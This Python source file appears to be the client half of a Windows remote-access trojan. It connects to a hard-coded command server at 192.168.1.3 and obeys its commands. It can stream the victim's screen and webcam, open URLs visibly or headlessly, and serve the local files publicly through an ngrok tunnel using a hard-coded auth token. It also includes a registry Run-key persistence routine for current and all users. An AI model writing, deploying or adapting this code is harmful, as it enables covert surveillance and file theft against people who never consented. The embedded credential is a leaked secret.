import ctypes
import socket
import threading
import sys
import time
import requests
import webbrowser
from vidstream import ScreenShareClient, CameraClient
import cv2
import winreg
import os
import win32con
from flask_file_server import create_app
from pyngrok import ngrok
from waitress import serve

# Global variables to control the client
client = None
cam_client = None
client_socket = None
ngrok_url = None

ip_address = "192.168.1.3"


def list_cameras():
    index = 0
    arr = []
    while True:
        cap = cv2.VideoCapture(index)
        if not cap.read()[0]:
            break
        else:
            arr.append(index)
        cap.release()
        index += 1
    return arr


def start_explorer():
    global client_socket, ngrok_url
    ngrok.set_auth_token("2lxpXh54FYtMy8IUFJ7sUrpj1cK_oqUGwMH35tfzDBKgYyKm")

    # Create Flask application
    app = create_app()
    port = 5000

    # Start ngrok tunnel
    def start_tunnel():
        global ngrok_url
        if ngrok_url is None:
            try:
                public_url = ngrok.connect(port)
                ngrok_url = public_url
                send_to_server(f"ngrok tunnel started: {ngrok_url}")
                print(f' * ngrok tunnel "{ngrok_url}" -> "http://127.0.0.1:{port}"')
            except Exception as e:
                send_to_server(f"Error starting ngrok tunnel: {e}")
                print(f"Error starting ngrok tunnel: {e}")
                return

    start_tunnel()

    # Run Flask application using waitress in a separate thread
    def run_flask():
        try:
            serve(app, host="0.0.0.0", port=port)
        except Exception as e:
            send_to_server(f"Error running Flask application: {e}")
            print(f"Error running Flask application: {e}")

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()


def start_stream():
    global client
    print("Starting streaming after 5 seconds...")
    send_to_server("Starting screen sharing...")

    time.sleep(5)

    if not client:
        client = ScreenShareClient(ip_address, 9998)

    client.start_stream()
    send_to_server("Screen sharing started.")


def start_cam():
    global cam_client
    available_cameras = list_cameras()
    if not available_cameras:
        print("No cameras available.")
        send_to_server("No cameras available.")
        return

    print(f"Available cameras: {available_cameras}")

    time.sleep(5)
    try:
        if not cam_client:
            cam_client = CameraClient(ip_address, 9998)
        cam_client.start_stream()
        send_to_server("Camera streaming started.")
    except Exception as e:
        send_to_server(f"Error creating CameraClient: {e}")
        print(f"Error creating CameraClient: {e}")
        return


def stop_stream():
    global client
    print("Stopping streaming...")
    send_to_server("Stopping screen sharing...")

    if client:
        client.stop_stream()
        send_to_server("Screen sharing stopped.")


def stop_cam():
    global cam_client
    print("Stopping Camera...")
    send_to_server("Stopping camera...")

    if cam_client:
        cam_client.stop_stream()
        send_to_server("Camera streaming stopped.")


def open_url_headless(url):
    print(f"Sending traffic to {url} without opening a browser...")
    send_to_server(f"Opening URL headless: {url}")
    try:
        response = requests.get(url)
        print(f"Headless URL traffic response: {response.status_code}")
        send_to_server(f"Headless URL traffic response: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
        send_to_server(f"Error accessing URL headless: {e}")


def open_url(url):
    print(f"Opening {url} in browser...")
    send_to_server(f"Opening URL: {url}")
    webbrowser.open(url)


def send_to_server(message: str):
    global client_socket
    if client_socket:
        try:
            client_socket.send(message.encode())
        except Exception as e:
            print(f"Error sending message to server: {e}")


def receive_commands(client_socket):
    global client

    while True:
        try:
            command = client_socket.recv(1024).decode().lower().strip()
            if not command:
                print("Server has closed the connection. Exiting...")
                break

            if command.startswith("open url headless"):
                _, url = command.split("headless", 1)
                open_url_headless(url)

            elif command.startswith("open url"):
                _, url = command.split("url", 1)
                open_url(url)

            elif command == "start stream":
                print("Executing: start stream")
                send_to_server("Start stream command received.")
                start_stream()

            elif command == "start camera":
                print("Executing: start camera")
                send_to_server("Start camera command received.")
                start_cam()

            elif command == "stop stream":
                print("Executing: stop stream")
                send_to_server("Stop stream command received.")
                stop_stream()

            elif command == "stop camera":
                print("Executing: stop camera")
                send_to_server("Stop camera command received.")
                stop_cam()

            elif command == "start explorer":
                print("Executing: start explorer")
                send_to_server("Start explorer command received.")
                start_explorer()

            else:
                print(f"Unknown command received: {command}")
                send_to_server(f"Unknown command received: {command}")

        except Exception as e:
            print(f"Error receiving command: {e}")
            send_to_server(f"Error receiving command: {e}")
            break


def connect_to_server(host=ip_address, port=9999):
    global client_socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            client_socket.connect((host, port))
            print(f"Connected to command server at {host}:{port}")
            return client_socket
        except socket.error as e:
            print(f"Couldn't connect to the server. Error: {e}. Retrying...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("Client interrupted.")
            client_socket.close()
            if client:
                client.stop_stream()
            sys.exit()


def client_thread_function():
    global client_socket
    client_socket = connect_to_server()

    command_thread = threading.Thread(target=receive_commands, args=(client_socket,))
    command_thread.start()

    try:
        command_thread.join()
    except KeyboardInterrupt:
        print("Client interrupted.")


def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Application added to startup.")

        # Add for all users (requires admin privileges)
        reg_path_all_users = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, reg_path_all_users, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Application added to startup for all users.")
    except Exception as e:
        print(f"Failed to add application to startup: {e}")


if __name__ == "__main__":
    # Uncomment the next line to add the application to startup
    # add_to_startup()
    client_thread = threading.Thread(target=client_thread_function)
    client_thread.start()
